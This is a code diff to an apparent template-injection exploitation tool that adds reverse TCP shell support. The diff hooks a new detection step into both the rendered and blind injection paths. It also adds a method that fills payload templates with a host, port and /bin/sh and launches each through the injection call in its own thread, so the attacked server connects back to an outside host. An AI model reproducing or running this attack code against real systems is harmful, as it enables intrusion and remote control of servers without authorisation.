@@ -62,6 +62,7 @@ class Plugin(object):
                 self.detect_write()
                 self.detect_read()
                 self.detect_tcp_shell()
+                self.detect_reverse_tcp_shell()
 
         # Manage blind injection only if render detection has failed
         if not self.get('engine'):
@@ -78,6 +79,7 @@ class Plugin(object):
                 self.detect_blind_read()
                 self.detect_blind_write()
                 self.detect_tcp_shell()
+                self.detect_reverse_tcp_shell()
 
     def _generate_contexts(self):
 
@@ -630,3 +632,33 @@ class Plugin(object):
             reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
             reqthread.start()
             yield reqthread
+
+    def detect_reverse_tcp_shell(self):
+
+        # Assume tcp shell capabilities only if execute or execute_blind are set
+        if not (self.get('execute') or self.get('execute_blind')) or not self.actions.get('reverse_tcp_shell'):
+            return
+
+        self.set('reverse_tcp_shell', True)
+
+
+    def reverse_tcp_shell(self, host, port, shell = "/bin/sh"):
+
+        action = self.actions.get('reverse_tcp_shell', {})
+        payload_actions = action.get('reverse_tcp_shell')
+        call_name = action.get('call', 'inject')
+
+        # Skip if something is missing or call function is not set
+        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
+            return
+
+        for payload_action in payload_actions:
+
+            execution_code = payload_action % ({
+                'port' : port,
+                'shell' : shell,
+                'host': host,
+            })
+
+            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
+            reqthread.start()
